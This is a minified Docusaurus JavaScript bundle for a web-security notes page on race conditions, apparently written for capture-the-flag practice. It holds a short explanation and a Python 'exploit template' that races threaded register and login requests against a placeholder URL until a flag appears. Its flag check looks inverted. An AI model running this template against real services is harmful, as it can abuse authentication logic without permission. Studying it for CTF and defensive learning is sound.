"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[8634],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>f});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},s=Object.keys(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var c=r.createContext({}),l=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},u=function(e){var n=l(e.components);return r.createElement(c.Provider,{value:n},e.children)},d="mdxType",p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,s=e.originalType,c=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),d=l(t),m=o,f=d["".concat(c,".").concat(m)]||d[m]||p[m]||s;return t?r.createElement(f,a(a({ref:n},u),{},{components:t})):r.createElement(f,a({ref:n},u))}));function f(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var s=t.length,a=new Array(s);a[0]=m;var i={};for(var c in n)hasOwnProperty.call(n,c)&&(i[c]=n[c]);i.originalType=e,i[d]="string"==typeof e?e:o,a[1]=i;for(var l=2;l<s;l++)a[l]=t[l];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},3828:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>p,frontMatter:()=>s,metadata:()=>i,toc:()=>l});var r=t(7462),o=(t(7294),t(3905));const s={id:"race-condition",title:"Race conditions"},a="Race conditions",i={unversionedId:"security/web/race-condition",id:"security/web/race-condition",title:"Race conditions",description:"A race condition happens when concurrent calls lead to a not wanted status of the system.",source:"@site/docs/security/05-web/race_conditions.md",sourceDirName:"security/05-web",slug:"/security/web/race-condition",permalink:"/docs/security/web/race-condition",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/race_conditions.md",tags:[],version:"current",frontMatter:{id:"race-condition",title:"Race conditions"},sidebar:"securitySidebar",previous:{title:"Login brute force",permalink:"/docs/security/web/login-brute-force"},next:{title:"Serialization",permalink:"/docs/security/web/serialization"}},c={},l=[{value:"Exploit template",id:"exploit-template",level:2}],u={toc:l},d="wrapper";function p(e){let{components:n,...s}=e;return(0,o.kt)(d,(0,r.Z)({},u,s,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"race-conditions"},"Race conditions"),(0,o.kt)("p",null,"A race condition happens when concurrent calls lead to a not wanted status of the system.\nThis can occur in web app because they are thought for multiple user access at the same time."),(0,o.kt)("p",null,"For example, consider two users that want to modify the same value.\nThey interact with the server and ask to it in parallel for two different changes.\nNo synchronization between calls, no transactions for read and write or whatever multithreads control system is implemented."),(0,o.kt)("p",{align:"center"},(0,o.kt)("img",{src:t(1378).Z})),(0,o.kt)("h2",{id:"exploit-template"},"Exploit template"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'#!/usr/bin/env python3\n\nimport random\nimport string\nimport requests\nimport threading\nimport time\n\n# change this value with the base url like "https://challenge.pwn"\nURL = "URL"\n\n# very simple way for multithread communication\n# remember to use `global found`\nfound = False\n\n\ndef register(session, username, password):\n    url = "%s/register" % URL\n    payload = {"username": username, "password": password}\n    r = session.post(url, data=payload)\n    return r.text\n\n\ndef login(session, username, password):\n    # import global found to communicate with the main thread\n    global found\n\n    url = "%s/login" % URL\n    payload = {"username": username, "password": password}\n    r = session.post(url, data=payload)\n\n    # check for flag and print output\n    if "flag" not in r.text:\n        print(r.text)\n        found = True\n\n    return r.text\n\n\ndef random_string():\n    k = random.randint(6, 15)\n    allowed_chars = string.ascii_lowercase + string.digits\n    return "".join(random.choices(allowed_chars, k=k))\n\n\n# test calls\n\nsession = requests.Session()\nusername = random_string()\npassword = random_string()\n\nres = register(session, username, password)\nassert "success" in res\n\nres = login(session, username, password)\nassert "success" in res\n\n# start exploit\n\nwhile not found:\n    session = requests.Session()\n    username = random_string()\n    password = random_string()\n\n    t_register = threading.Thread(target=register,\n        args=(session, username, password))\n    t_register.start()\n\n    # sometimes, a small delay between calls could be needed\n    k = random.random() / 10\n    time.sleep(k)\n\n    t_login = threading.Thread(target=login,\n        args=(session, username, password))\n    t_login.start()\n\n    # wait for the last thread to finish\n    t_login.join(timeout=1)\n')))}p.isMDXComponent=!0},1378:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/race_condition-a64c8b3cc6421ae69c9889efcd349580.jpg"}}]);